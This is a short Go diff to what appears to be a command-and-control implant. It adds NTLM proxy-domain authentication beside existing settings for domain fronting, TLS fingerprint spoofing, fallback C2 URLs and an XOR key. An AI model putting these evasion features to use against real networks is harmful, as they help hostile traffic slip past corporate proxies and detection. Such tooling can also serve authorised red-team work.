@@ -22,8 +22,9 @@ var (
 	postURI        string = "/data"
 	hostHeader     string = ""     // Override Host header for domain fronting
 	proxyURL       string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
-	proxyUser      string = ""     // Proxy authentication username (Basic auth)
-	proxyPass      string = ""     // Proxy authentication password (Basic auth)
+	proxyUser      string = ""     // Proxy authentication username
+	proxyPass      string = ""     // Proxy authentication password
+	proxyDomain    string = ""     // Proxy NTLM domain (triggers NTLM auth when set)
 	tlsVerify      string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 	tlsFingerprint string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts  string = ""     // Comma-separated fallback C2 URLs for automatic failover
@@ -86,6 +87,7 @@ func clearGlobals() {
 	proxyURL = ""
 	proxyUser = ""
 	proxyPass = ""
+	proxyDomain = ""
 	customHeaders = ""
 	xorKey = ""
 	tlsVerify = ""
